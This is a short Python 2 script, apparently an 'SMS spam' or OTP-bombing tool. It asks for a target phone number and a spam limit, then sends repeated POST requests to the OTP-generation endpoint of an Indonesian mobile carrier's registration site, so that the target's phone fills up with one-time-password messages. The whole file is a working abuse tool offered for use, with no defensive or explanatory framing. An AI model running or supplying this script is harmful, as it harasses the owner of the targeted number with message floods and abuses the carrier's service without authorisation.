#!/usr/bin/env python

import requests

nomor = raw_input("[+] Target	: ")
limit = raw_input("[+] Spam Limit	: ")

url = "https://registrasi.tri.co.id/daftar/generateOTP"
payload = { "msisdn" : "%s" %nomor }
print ""

for i in range(int(limit)):
	res = requests.post(url, data=payload)
	print "[+] Status ->", res.text

print "[+] Done"
